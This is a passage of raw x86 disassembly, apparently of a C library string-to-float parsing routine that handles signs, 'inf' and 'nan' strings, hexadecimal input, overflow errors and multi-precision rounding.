lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_15ch], ebx
jg 0x8089cfe
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_15ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089cb3
mov esi, dword [var_1ach]
test esi, esi
je 0x8089b7d
neg ebx
mov dword [var_15ch], ebx
jmp 0x8089b7d
cmp dword [var_188h], 0xffffffff
je 0x8089d58
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_1ach]
test eax, eax
jne 0x8089d54
mov eax, dword [var_164h]
test eax, eax
je 0x8089d4c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x8089d2c
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x8089d2c
fldz
jmp 0x8089d2c
mov eax, dword [var_164h]
test eax, eax
je 0x8089d54
fld dword [0x80a6104]
jmp 0x8089d2c
mov eax, dword [var_188h]
sub eax, dword [var_184h]
lea edx, [eax + 0x134]
jmp 0x8089cb3
mov eax, dword [var_1ach]
mov ecx, dword [var_184h]
test eax, eax
lea edx, [ecx*4 + 0x432]
jne 0x8089cb3
mov edx, dword [var_188h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x400]
jmp 0x8089cb3
mov edi, dword [var_17ch]
jmp 0x8089b7d
inc edi
movzx esi, byte [edi]
jmp 0x8089c81
mov dword [var_1ach], 1
jmp 0x8089dbf
cmp dword [ecx + eax*4], 0x70
jmp 0x8089b77
cmp dword [var_168h], 0x10
je 0x8089df6
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x8089b60
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
jmp 0x8089b60
mov edx, esi
movsx eax, dl
jmp 0x8089deb
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
jmp 0x8089aeb
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x80884e6
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80884ab
cmp eax, 0x66
ja 0x80884ab
mov esi, esi
inc dword [var_180h]
jmp 0x80884e0
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8089e87
cmp dl, byte [ecx + 0x198]
jle 0x8088483
xor ebx, ebx
cmp byte [var_205h], 0
je 0x8088483
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8088483
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089e9f
jmp 0x8088483
lea esi, [esi]
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x808846b
mov ecx, esi
cmp cl, 0x30
jne 0x808846f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8089ed9
jmp 0x808846f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x8088414
add edi, 2
mov dword [var_168h], 0x10
movzx esi, byte [edi]
mov dword [var_194h], 0
jmp 0x8088414
test al, al
jne 0x808823d
jmp 0x808822d
mov edx, dword [var_18ch]
movzx eax, byte [edx]
jmp 0x8089f1b
inc edi
movzx esi, byte [edi]
jmp 0x80881f4
mov dword [var_164h], 1
jmp 0x8089f33
push ebp
mov eax, 0
mov ebp, esp
sub esp, 0x10
test eax, eax
je 0x8085c00
mov dword [esp], 3
call section.
mov dword [var_ch], eax
mov eax, dword [arg_10h]
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08086280
leave
ret
lea esi, [esi]
mov eax, dword [0x80a9ab4]
jmp 0x8085bdb
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x11c
mov ecx, dword [arg_10h]
mov eax, dword [arg_14h]
mov dword [var_64h], 0xa
mov dword [var_8ch], 0
test ecx, ecx
mov edx, dword [eax + 4]
je 0x80862d6
mov ecx, dword [edx + 0x2c]
mov dword [var_90h], ecx
movzx eax, byte [ecx]
test al, al
jle 0x80862d6
cmp al, 0x7f
je 0x80862d6
mov esi, dword [edx + 0x28]
mov dword [var_8ch], esi
cmp byte [esi], 0
jne 0x80862e0
mov dword [var_8ch], 0
mov dword [var_90h], 0
mov edx, dword [edx + 0x24]
mov dword [var_88h], edx
mov dword [esp], edx
call fcn.08053400
mov edi, dword [arg_8h]
mov dword [var_6ch], 0
mov dword [var_94h], eax
mov dword [var_58h], 0
mov dword [var_60h], 0
mov eax, dword [arg_14h]
dec edi
mov edx, dword [eax + 0x34]
inc edi
movzx esi, byte [edi]
mov ecx, esi
movsx eax, cl
test byte [edx + eax*2 + 1], 0x20
jne 0x8086316
cmp cl, 0x2d
je 0x8087bd8
cmp cl, 0x2b
je 0x8087bcf
mov edx, dword [var_88h]
xor ebx, ebx
movzx edx, byte [edx]
test dl, dl
mov byte [var_fdh], dl
mov byte [var_edh], dl
je 0x8087bc4
mov eax, edx
lea esi, [esi]
cmp byte [ebx + edi], al
jne 0x8087bb7
mov ecx, dword [var_88h]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086360
movzx eax, byte [ebx + edi]
cmp al, 0x2f
jle 0x8086388
cmp al, 0x39
jle 0x8086524
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086524
mov ecx, esi
mov esi, dword [arg_14h]
movsx eax, cl
mov ebx, eax
mov ecx, dword [esi + 0x38]
cmp dword [ecx + eax*4], 0x69
je 0x80864b0
cmp dword [ecx + ebx*4], 0x6e
jne 0x8086497
mov ecx, dword [arg_14h]
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fb8
mov dword [esp], edi
mov dword [var_ch], ecx
call fcn.0808dd40
test eax, eax
jne 0x8086497
add edi, 3
mov esi, 0x7fc00000
cmp byte [edi], 0x28
je 0x808640d
mov eax, dword [arg_ch]
test eax, eax
je 0x80863f4
mov eax, dword [arg_ch]
mov dword [eax], edi
mov eax, esi
mov dword [var_104h], eax
fld dword [ebp - 0x104]
add esp, 0x11c
pop ebx
pop esi
pop edi
leave
ret
mov eax, dword [arg_14h]
mov ebx, edi
mov ecx, dword [eax + 0x38]
inc edi
movzx edx, byte [edi]
lea eax, [edx - 0x30]
cmp al, 9
jbe 0x8086415
movsx eax, dl
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jle 0x8086430
cmp eax, 0x7a
jle 0x8086415
cmp dl, 0x5f
je 0x8086415
cmp dl, 0x29
je 0x808643e
mov edi, ebx
jmp 0x80863e8
mov edx, dword [arg_14h]
lea eax, [var_50h]
mov dword [var_ch], 0
mov dword [var_4h], eax
mov dword [var_8h], 0
lea eax, [ebx + 1]
mov dword [esp], eax
mov dword [var_10h], edx
call fcn.080856c0
cmp dword [var_50h], edi
mov ecx, eax
jne 0x80863e8
xor edx, edx
and eax, 0x7fffff
mov esi, edx
or esi, eax
jne 0x8086484
mov ecx, 0x400000
mov eax, ecx
and eax, 0x7fffff
or eax, 0x7f800000
mov esi, eax
jmp 0x80863e8
mov eax, dword [arg_ch]
test eax, eax
je 0x80864a6
mov ecx, dword [arg_8h]
mov edx, dword [arg_ch]
mov dword [edx], ecx
mov eax, 0
jmp 0x80863f6
mov dword [var_ch], esi
mov dword [var_8h], 3
mov dword [var_4h], 0x80a0fc0
mov dword [esp], edi
call fcn.0808dd40
test eax, eax
jne 0x8086519
mov edx, dword [arg_ch]
test edx, edx
je 0x8086503
lea ebx, [edi + 3]
mov dword [var_ch], esi
mov dword [var_8h], 5
mov dword [esp], ebx
mov dword [var_4h], str.inity
call fcn.0808dd40
test eax, eax
lea edx, [edi + 8]
mov eax, dword [arg_ch]
cmove ebx, edx
mov dword [eax], ebx
mov ecx, dword [var_60h]
mov eax, 0x7f800000
test ecx, ecx
cmovne eax, dword [0x80a6100]
jmp 0x80863f6
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
jmp 0x80863aa
mov eax, esi
cmp al, 0x30
je 0x8087b87
mov eax, dword [var_8ch]
mov dword [var_74h], edi
test eax, eax
je 0x8087b6d
mov ecx, dword [var_8ch]
movzx edx, byte [ecx]
mov eax, esi
cmp al, 0x30
je 0x8086576
xor ebx, ebx
test dl, dl
je 0x8087b5f
mov ecx, dword [var_8ch]
movzx eax, byte [ecx]
mov ecx, esi
cmp cl, al
jne 0x8086580
mov ecx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + ecx]
test al, al
jne 0x8086561
inc edi
movzx esi, byte [edi]
jmp 0x8086548
lea esi, [esi]
test al, al
je 0x8086576
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8086595
cmp dword [var_64h], 0x10
je 0x8087b0e
mov dword [var_70h], edi
mov dword [var_7ch], 0
nop
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8087b06
cmp dword [var_64h], 0x10
je 0x8087ae6
mov eax, dword [var_8ch]
test eax, eax
je 0x80865f0
mov ecx, dword [var_8ch]
xor ebx, ebx
movzx eax, byte [ecx]
test al, al
je 0x8087ad8
cmp al, byte [ebx + edi]
jne 0x80865ec
mov edx, dword [var_8ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x80865d2
inc edi
movzx esi, byte [edi]
jmp 0x80865a0
test al, al
je 0x80865e6
mov eax, dword [var_90h]
test eax, eax
je 0x80877c3
mov eax, dword [var_7ch]
test eax, eax
jle 0x80877c3
mov ecx, dword [var_74h]
mov eax, dword [var_90h]
mov dword [var_4h], edi
mov edx, dword [var_8ch]
mov dword [esp], ecx
mov dword [var_ch], eax
mov dword [var_8h], edx
call fcn.08049980
cmp edi, eax
mov ecx, eax
je 0x80877b4
cmp eax, dword [var_74h]
je 0x808779c
cmp eax, dword [var_70h]
jb 0x808778c
mov ecx, dword [var_70h]
mov edi, eax
mov dword [var_7ch], 0
cmp ecx, eax
jae 0x8086670
movzx eax, byte [ecx]
mov edx, dword [var_7ch]
inc edx
sub eax, 0x30
cmp al, 9
cmova edx, dword [var_7ch]
inc ecx
cmp ecx, edi
mov dword [var_7ch], edx
jb 0x8086658
mov ecx, dword [var_7ch]
mov dword [var_84h], 0
mov dword [var_80h], ecx
mov ebx, dword [arg_ch]
test ebx, ebx
je 0x808668c
mov edx, dword [arg_ch]
mov dword [edx], edi
mov ecx, dword [var_7ch]
test ecx, ecx
jne 0x80866a9
mov edx, dword [var_60h]
mov eax, 0
test edx, edx
cmovne eax, dword [0x80a6104]
jmp 0x80863f6
mov eax, dword [var_84h]
test eax, eax
je 0x8086743
mov ecx, dword [var_88h]
mov esi, dword [var_88h]
movzx ecx, byte [ecx]
mov byte [var_fdh], cl
movzx edx, byte [esi + 1]
mov ecx, dword [var_70h]
movzx eax, byte [var_fdh]
cmp byte [ecx], al
je 0x80866e3
inc dword [var_70h]
jmp 0x80866d0
test dl, dl
mov ebx, 1
je 0x8087780
mov esi, dword [var_88h]
movzx eax, byte [esi + 1]
mov ecx, dword [var_70h]
cmp al, byte [ebx + ecx]
jne 0x8087771
mov esi, dword [var_88h]
inc ebx
movzx eax, byte [ebx + esi]
test al, al
jne 0x80866fa
mov eax, dword [var_84h]
add eax, dword [var_94h]
add dword [var_70h], eax
cmp dword [var_64h], 0x10
je 0x808775e
mov edx, dword [var_58h]
sub edx, dword [var_84h]
mov esi, dword [var_84h]
mov dword [var_58h], edx
sub dword [var_7ch], esi
cmp dword [var_64h], 0x10
je 0x8087597
mov ebx, dword [var_58h]
test ebx, ebx
mov edx, ebx
js 0x8087581
mov eax, dword [var_7ch]
sub eax, dword [var_80h]
cmp ebx, eax
cmovle eax, ebx
add dword [var_80h], eax
mov ebx, edx
sub ebx, eax
mov eax, dword [var_80h]
mov dword [var_58h], ebx
add eax, ebx
cmp eax, 0x27
jg 0x80868b9
cmp ebx, 0xffffffd4
jl 0x8087571
mov esi, dword [var_80h]
test esi, esi
jle 0x8086a28
mov esi, dword [var_88h]
mov edx, dword [var_8ch]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov eax, dword [var_70h]
mov dword [var_14h], esi
mov dword [var_1ch], edx
mov esi, dword [var_80h]
mov dword [var_18h], ecx
lea edx, [var_5ch]
mov dword [esp], eax
lea ecx, [var_2ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], esi
call fcn.08086060
mov ebx, dword [var_58h]
mov dword [var_70h], eax
test ebx, ebx
jle 0x808689f
lea edx, [var_2ch]
lea ecx, [var_4ch]
mov edi, 1
mov dword [var_a0h], edx
mov dword [var_a4h], ecx
mov dword [var_a8h], 0x80a7020
test edi, ebx
je 0x808687f
mov eax, dword [var_a8h]
mov edx, dword [var_5ch]
xor ebx, edi
mov dword [var_58h], ebx
mov esi, dword [eax + 4]
sub esi, 2
cmp edx, esi
jl 0x8087542
mov dword [var_10h], esi
mov eax, dword [eax]
mov dword [var_8h], edx
mov edx, dword [var_a4h]
lea eax, [eax*4 + 0x80a6248]
mov dword [var_ch], eax
mov dword [esp], edx
mov eax, dword [var_a0h]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edx, eax
mov eax, dword [var_5ch]
add eax, esi
test edx, edx
mov dword [var_5ch], eax
jne 0x8086864
dec eax
mov dword [var_5ch], eax
mov eax, dword [var_a0h]
mov esi, dword [var_a4h]
mov ebx, dword [var_58h]
mov dword [var_a0h], esi
mov dword [var_a4h], eax
add edi, edi
add dword [var_a8h], 0x10
test ebx, ebx
jne 0x8086805
lea eax, [var_4ch]
cmp dword [var_a0h], eax
je 0x808752c
mov esi, dword [var_5ch]
bsr edx, dword [ebp + esi*4 - 0x30]
xor edx, 0x1f
mov eax, esi
shl eax, 5
sub eax, edx
mov dword [var_6ch], eax
add eax, 0xffffff80
jle 0x80868c9
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8086503
cmp dword [var_6ch], 0x18
jle 0x8086a09
mov edx, dword [var_6ch]
mov eax, dword [var_6ch]
mov dword [var_b4h], 0x1f
add edx, 7
sub eax, 0x18
mov edi, eax
cmovs edi, edx
sar edi, 5
mov edx, edi
lea ecx, [edi - 1]
shl edx, 5
sub eax, edx
mov dword [var_ach], eax
cmovne ecx, edi
mov edx, dword [var_ach]
dec eax
mov dword [var_b0h], ecx
test edx, edx
cmove eax, dword [var_b4h]
mov dword [var_b4h], eax
jne 0x8086999
mov eax, dword [ebp + edi*4 - 0x2c]
mov dword [var_54h], eax
mov eax, dword [var_2ch]
xor ebx, ebx
test eax, eax
jne 0x808693b
inc ebx
mov eax, dword [ebp + ebx*4 - 0x2c]
test eax, eax
je 0x8086932
xor eax, eax
mov esi, dword [var_7ch]
cmp dword [var_80h], esi
jl 0x808694d
cmp ebx, dword [var_b0h]
jge 0x8086952
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_b0h]
mov ecx, dword [var_60h]
mov eax, dword [var_b4h]
mov dword [var_8h], ecx
mov dword [var_10h], eax
mov eax, dword [ebp + edx*4 - 0x2c]
mov dword [var_ch], eax
mov eax, dword [var_6ch]
dec eax
mov dword [var_4h], eax
lea esi, [var_54h]
mov dword [esp], esi
call fcn.08085e00
fstp dword [ebp - 0x104]
mov eax, dword [var_104h]
jmp 0x80863f6
lea eax, [esi - 1]
mov ebx, edi
cmp edi, eax
jge 0x80869eb
mov dword [var_108h], 0x20
mov ecx, dword [var_ach]
mov dword [var_b8h], eax
sub dword [var_108h], ecx
lea esi, [var_54h]
movzx ecx, byte [var_ach]
mov edx, dword [ebp + ebx*4 - 0x2c]
mov eax, dword [ebp + ebx*4 - 0x28]
inc ebx
shr edx, cl
movzx ecx, byte [var_108h]
shl eax, cl
or edx, eax
mov dword [esi], edx
add esi, 4
cmp ebx, dword [var_b8h]
jl 0x80869c1
mov eax, ebx
sub eax, edi
test eax, eax
jg 0x8086929
movzx ecx, byte [var_ach]
mov eax, dword [ebp + ebx*4 - 0x2c]
shr eax, cl
jmp 0x8086926
mov eax, dword [var_80h]
cmp dword [var_7ch], eax
je 0x8087413
lea ecx, [esi*4]
lea edi, [var_54h]
lea esi, [var_2ch]
cld
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov esi, 0x1a
lea eax, [var_4ch]
lea edx, [var_2ch]
sub esi, dword [var_6ch]
mov dword [var_c8h], eax
mov dword [var_cch], edx
mov edx, 0x55555556
mov ecx, dword [var_7ch]
mov dword [var_d0h], 0x80a7020
sub ecx, dword [var_80h]
mov dword [var_c4h], 0
mov eax, esi
imul edx
mov eax, esi
sar eax, 0x1f
sub edx, eax
lea eax, [edx + 2]
cmp ecx, eax
jle 0x8086a87
mov ecx, dword [var_80h]
mov dword [var_c4h], 1
lea edx, [edx + ecx + 2]
mov dword [var_7ch], edx
mov esi, dword [var_7ch]
mov dword [var_68h], 0
sub esi, dword [var_80h]
sub esi, ebx
mov ebx, 1
mov dword [var_c0h], esi
test dword [var_c0h], ebx
je 0x8086ae3
mov eax, dword [var_68h]
xor dword [var_c0h], ebx
test eax, eax
jne 0x80873a0
mov eax, dword [var_d0h]
mov edi, dword [var_c8h]
cld
mov edx, dword [eax + 4]
mov esi, dword [eax]
sub edx, 2
lea esi, [esi*4 + 0x80a6248]
mov ecx, edx
mov dword [var_68h], edx
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
mov eax, dword [var_c0h]
add ebx, ebx
add dword [var_d0h], 0x10
test eax, eax
jne 0x8086aa1
lea eax, [var_2ch]
cmp dword [var_c8h], eax
je 0x808738a
mov edx, dword [var_8ch]
mov esi, dword [var_88h]
lea eax, [var_58h]
mov ecx, dword [var_94h]
mov dword [var_10h], eax
mov dword [var_1ch], edx
mov dword [var_14h], esi
lea edx, [var_5ch]
mov esi, dword [var_80h]
mov dword [var_ch], edx
mov dword [var_18h], ecx
sub dword [var_7ch], esi
mov edx, dword [var_70h]
lea ecx, [var_2ch]
mov eax, dword [var_7ch]
mov dword [var_8h], ecx
mov dword [esp], edx
mov dword [var_4h], eax
call fcn.08086060
mov ecx, dword [var_68h]
bsr eax, dword [ebp + ecx*4 - 0x50]
mov ebx, eax
xor ebx, 0x1f
jle 0x8086ba1
lea esi, [var_4ch]
mov dword [var_8h], ecx
mov dword [var_ch], ebx
mov dword [var_4h], esi
mov dword [esp], esi
call fcn.0808c6f0
mov eax, dword [var_5ch]
lea edx, [var_2ch]
mov dword [var_ch], ebx
mov dword [var_4h], edx
mov dword [esp], edx
mov dword [var_8h], eax
call fcn.0808c6f0
test eax, eax
mov edx, eax
je 0x8086ba1
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], edx
inc eax
mov dword [var_5ch], eax
cmp dword [var_68h], 1
mov esi, dword [var_6ch]
mov dword [var_58h], esi
je 0x8087273
cmp dword [var_68h], 2
je 0x8086fef
mov eax, dword [var_68h]
mov ecx, dword [var_68h]
mov dword [var_e8h], 0
xor edi, edi
mov edx, dword [ebp + eax*4 - 0x54]
mov esi, dword [ebp + eax*4 - 0x50]
mov eax, dword [var_5ch]
mov dword [var_e4h], edx
sub ecx, eax
mov dword [var_8h], eax
lea eax, [ebp + ecx*4 - 0x4c]
mov dword [var_4h], eax
lea eax, [var_2ch]
mov dword [esp], eax
call fcn.0808c330
test eax, eax
jle 0x8086c0a
mov eax, dword [var_5ch]
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
mov dword [var_5ch], eax
mov edx, dword [var_5ch]
cmp edx, dword [var_68h]
jge 0x8086fd5
mov ecx, dword [var_68h]
mov eax, dword [var_6ch]
sub ecx, edx
test eax, eax
mov dword [var_ech], ecx
jle 0x8086f8a
mov eax, dword [var_ech]
shl eax, 5
add eax, dword [var_6ch]
cmp eax, 0x18
jg 0x8086ed6
test edx, edx
mov dword [var_54h], 0
mov ecx, edx
jle 0x8086c64
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086c4e
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086c7e
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086c71
shl dword [var_ech], 5
mov edx, dword [var_ech]
add dword [var_6ch], edx
mov eax, dword [var_68h]
cmp dword [var_6ch], 0x18
mov dword [ebp + eax*4 - 0x4c], 0
mov edx, eax
mov eax, dword [ebp + eax*4 - 0x2c]
mov ebx, eax
jg 0x8086ddb
lea ecx, [edx + 1]
lea eax, [edx - 1]
mov dword [var_f8h], ecx
mov dword [var_f4h], eax
cmp ebx, esi
mov edi, 0xffffffff
je 0x8086d0f
mov edx, dword [var_68h]
mov eax, dword [ebp + edx*4 - 0x30]
mov edx, ebx
div esi
mov ecx, edx
mov edi, eax
mov eax, dword [var_e4h]
mul edi
cmp edx, ecx
mov ebx, eax
jbe 0x8086ebe
add ecx, esi
dec edi
cmp ecx, esi
jb 0x8086d0f
cmp ebx, dword [var_e4h]
lea eax, [edx - 1]
cmovb edx, eax
sub ebx, dword [var_e4h]
cmp edx, ecx
ja 0x8086ce7
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
mov edx, dword [var_f8h]
lea ecx, [var_4ch]
lea eax, [var_2ch]
mov dword [var_ch], edi
mov dword [var_4h], ecx
mov dword [esp], eax
mov dword [var_8h], edx
call fcn.0808d600
mov edx, dword [var_68h]
cmp dword [ebp + edx*4 - 0x2c], eax
je 0x8086d53
lea eax, [var_2ch]
lea ecx, [var_4ch]
mov dword [var_ch], edx
mov dword [var_8h], ecx
mov dword [var_4h], eax
mov dword [esp], eax
dec edi
call fcn.0808c2a0
mov ecx, dword [var_68h]
mov edx, dword [var_f4h]
mov eax, dword [ebp + ecx*4 - 0x30]
test edx, edx
mov dword [ebp + ecx*4 - 0x2c], eax
mov ebx, eax
jle 0x8086d77
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086d6a
mov eax, dword [var_6ch]
test eax, eax
jne 0x8086e4c
test edi, edi
mov edx, 0x20
je 0x8086d91
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8086e39
add edx, 0x18
mov eax, edi
mov dword [var_fch], 0x39
sub ecx, edx
mov dword [var_e8h], edx
shr eax, cl
mov dword [var_54h], eax
mov ecx, dword [var_fch]
cmp ecx, 0x18
mov dword [var_6ch], ecx
jle 0x8086cbd
mov esi, dword [var_68h]
mov eax, dword [ebp + esi*4 - 0x2c]
test eax, eax
mov edx, dword [var_68h]
jne 0x8086df3
test edx, edx
js 0x8086df3
dec edx
mov ebx, dword [ebp + edx*4 - 0x2c]
test ebx, ebx
jne 0x8086df3
test edx, edx
jns 0x8086de6
mov ecx, dword [var_c4h]
xor eax, eax
test ecx, ecx
jne 0x8086e03
test edx, edx
js 0x8086e08
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_54h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_e8h]
mov dword [var_10h], eax
mov eax, dword [var_60h]
mov dword [var_8h], eax
mov eax, dword [var_58h]
dec eax
mov dword [var_4h], eax
jmp 0x8086983
neg edx
mov dword [var_54h], edi
add edx, 0x20
mov dword [var_fch], edx
jmp 0x8086dc2
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x8086e65
mov dword [var_54h], edi
jmp 0x8086dc2
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086dc2
mov ecx, dword [var_e8h]
lea eax, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_e8h]
shr eax, cl
or dword [var_54h], eax
jmp 0x8086dc2
jne 0x8086d0f
mov eax, dword [var_68h]
cmp ebx, dword [ebp + eax*4 - 0x34]
ja 0x8086ce7
jmp 0x8086d0f
mov dword [var_e8h], 0x18
mov edx, dword [var_6ch]
sub dword [var_e8h], edx
cmp dword [var_e8h], 0x1f
jle 0x8086f56
mov ebx, dword [var_e8h]
mov ecx, dword [var_e8h]
mov dword [var_8h], 1
add ebx, 0x1f
cmp dword [var_e8h], 0xffffffff
cmovg ebx, dword [var_e8h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_54h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x54]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8086c7e
lea edx, [ebp + eax*4 - 0x54]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8086f45
jmp 0x8086c7e
mov eax, dword [var_e8h]
test eax, eax
jle 0x8086c7e
mov edx, dword [var_e8h]
lea ecx, [var_54h]
mov dword [var_8h], 1
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8086c7e
test edx, edx
mov ecx, edx
jle 0x8086fa6
mov eax, dword [var_ech]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0x30]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0x2c], eax
jg 0x8086f90
mov edx, dword [var_ech]
xor eax, eax
inc edx
cmp eax, edx
jge 0x8086fc0
mov dword [ebp + eax*4 - 0x2c], 0
inc eax
cmp eax, edx
jl 0x8086fb3
shl dword [var_ech], 5
mov edx, dword [var_ech]
sub dword [var_58h], edx
jmp 0x8086c8e
test edx, edx
jle 0x8086c8e
mov eax, dword [ebp + edx*4 - 0x30]
mov dword [ebp + edx*4 - 0x2c], eax
dec edx
test edx, edx
jg 0x8086fdd
jmp 0x8086c8e
cmp dword [var_5ch], 1
mov eax, dword [var_48h]
mov dword [var_dch], 0
mov dword [var_e0h], 0
mov edi, dword [var_4ch]
mov dword [var_d8h], eax
jle 0x80871ec
mov esi, dword [var_28h]
mov ebx, dword [var_2ch]
cmp dword [var_6ch], 0x18
jg 0x80870e1
cmp esi, dword [var_d8h]
je 0x80871b8
mov eax, ebx
mov edx, esi
div dword [var_d8h]
mov ecx, edx
mov dword [var_dch], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x8087057
jne 0x8087070
test ebx, ebx
je 0x8087070
add ecx, dword [var_d8h]
dec dword [var_dch]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_d8h]
jae 0x808704d
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_6ch]
test eax, eax
jne 0x808713c
mov eax, dword [var_dch]
mov edx, 0x20
test eax, eax
je 0x808709e
bsr edx, dword [var_dch]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_58h], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x18
jle 0x8087126
mov eax, dword [ebp - 0xdc]
add edx, 0x18
mov dword [ebp - 0xfc], 0x39
sub ecx, edx
mov dword [ebp - 0xe0], edx
shr eax, cl
mov dword [ebp - 0x54], eax
mov eax, dword [ebp - 0xfc]
cmp eax, 0x18
mov dword [ebp - 0x6c], eax
jle 0x8087029
mov edx, dword [var_c4h]
xor eax, eax
test edx, edx
jne 0x80870f5
test esi, esi
jne 0x80870f5
test ebx, ebx
je 0x80870fa
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_dch]
mov eax, 0x1f
sub eax, dword [var_e0h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_60h]
mov eax, dword [var_58h]
mov dword [var_8h], ecx
jmp 0x8086978
mov ecx, dword [ebp - 0xdc]
neg edx
add edx, 0x20
mov dword [ebp - 0xfc], edx
mov dword [ebp - 0x54], ecx
jmp 0x80870cf
mov eax, dword [var_6ch]
add eax, 0x20
cmp eax, 0x18
mov dword [var_fch], eax
jg 0x808715b
mov edx, dword [var_dch]
mov dword [var_54h], edx
jmp 0x80870cf
mov dword [var_e0h], 0x18
mov ecx, dword [var_6ch]
sub dword [var_e0h], ecx
mov ecx, dword [var_e0h]
test ecx, ecx
jle 0x80870cf
mov eax, dword [ebp - 0xe0]
lea edx, [ebp - 0x54]
mov dword [esp + 8], 1
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0xdc]
mov ecx, 0x20
sub ecx, dword [ebp - 0xe0]
shr eax, cl
or dword [ebp - 0x54], eax
jmp 0x80870cf
lea ecx, [esi + ebx]
mov dword [var_dch], 0xffffffff
cmp ecx, esi
jb 0x80871dc
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x808704d
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x808707a
mov eax, dword [var_2ch]
cmp eax, dword [var_d8h]
